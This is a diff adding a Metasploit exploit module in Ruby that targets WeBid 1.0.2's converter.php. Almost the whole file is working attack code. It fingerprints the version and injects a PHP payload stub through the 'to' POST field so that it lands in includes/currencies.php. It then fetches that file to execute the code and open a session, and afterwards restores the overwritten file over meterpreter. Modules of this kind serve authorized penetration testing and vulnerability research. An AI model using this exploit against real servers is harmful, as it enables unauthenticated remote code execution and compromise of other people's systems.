@@ -1,0 +1,164 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'WeBid converter.php Remote PHP Code Injection',
+			'Description'    => %q{
+					This module exploits a vulnerability found in WeBid version 1.0.2.
+				By abusing the converter.php file, a malicious user can inject PHP code
+				in the includes/currencies.php script without any authentication, which
+				results in arbitrary code execution.
+			},
+			'Author'         => [
+				'EgiX', # Vulnerability Discovery, PoC
+				'juan vazquez' # Metasploit module
+			],
+			'License'        => MSF_LICENSE,
+			'References'     =>
+				[
+					[ 'OSVDB', '73609' ],
+					[ 'EDB', '17487' ]
+				],
+			'Version'        => '$Revision: $',
+			'Privileged'     => false,
+			'Platform'       => ['php'],
+			'Arch'           => ARCH_PHP,
+			'Payload'        =>
+				{
+				},
+			'DisclosureDate' => 'Jul 05 2011',
+			'Targets'        =>
+				[
+					[ 'WeBid 1.0.2 / Ubuntu', {} ]
+				],
+			'DefaultTarget' => 0
+			))
+
+			register_options(
+				[
+					OptString.new('TARGETURI', [true, 'The base path to WeBid', '/WeBid'])
+				], self.class
+			)
+
+	end
+
+	def check
+		uri = target_uri.path
+		uri << '/' if uri[-1,1] != '/'
+
+		res = send_request_cgi({
+			'method' => 'GET',
+			'uri'    => uri + "docs/changes.txt"
+		})
+
+		if res and res.code == 200 and res.body =~ /1\.0\.2 \- 17\/01\/11/
+			return Exploit::CheckCode::Appears
+		end
+
+		res = send_request_cgi({
+			'method' => 'GET',
+			'uri'    => uri + "converter.php"
+		})
+
+		if res and res.code == 200 and res.body =~ /WeBId.*CURRENCY CONVERTER/
+			return Exploit::CheckCode::Detected
+		end
+
+		return Exploit::CheckCode::Safe
+
+	end
+
+	def on_new_session(client)
+
+		if client.type != "meterpreter"
+			print_error("NOTE: you must use a meterpreter payload in order to automatically cleanup.")
+			print_error("The currencies.php won't be restored automatically.")
+			return
+		end
+
+		# stdapi must be loaded before we can use fs.file
+		client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
+
+		# Original currencies.php file
+		currencies_php = <<-eof
+			<?php
+			$conversionarray[] = '1265375103';
+			$conversionarray[] = array(
+				array('from' => 'GBP', 'to' => 'AED', 'rate' => '')
+			);
+			?>
+		eof
+		currencies_php = currencies_php.gsub(/^\t\t\t/, '')
+
+		pwd = client.fs.dir.pwd
+		print_status("Searching currencies.php file from #{pwd}")
+
+		res = client.fs.file.search(nil, "currencies.php", true, -1)
+		res.each do |hit|
+			filename = "#{hit['path']}/#{hit['name']}"
+			print_status("Restoring #{filename}")
+			client.fs.file.rm(filename)
+			fd = client.fs.file.new(filename, "wb")
+			fd.write(currencies_php)
+			fd.close
+		end
+
+		print_status("Cleanup finished")
+
+	end
+
+	def exploit
+
+		uri = target_uri.path
+		uri << '/' if uri[-1,1] != '/'
+		peer = "#{rhost}:#{rport}"
+
+		stub = "\0'));#{payload.encoded}?>"
+
+		print_status("#{peer} - Injecting the PHP payload")
+
+		response = send_request_cgi({
+			'uri' => uri + "converter.php",
+			'method' => "POST",
+			'vars_post' => {
+				"action" => "convert",
+				"from" => "USD",
+				"to" => stub
+			}
+		})
+
+		if response and response.code != 200
+			print_error("Server returned non-200 status code (#{response.code})")
+			return
+		end
+
+		print_status("#{peer} - Executing the PHP payload")
+
+		timeout = 0.01
+		response = send_request_cgi({
+				'uri' => uri + "includes/currencies.php",
+				'method' => "GET",
+				'headers' => {
+						'Connection' => "close",
+					}
+				}, timeout)
+
+		if response and response.code != 200
+			print_error("Server returned non-200 status code (#{response.code})")
+		end
+
+		handler
+	end
+end
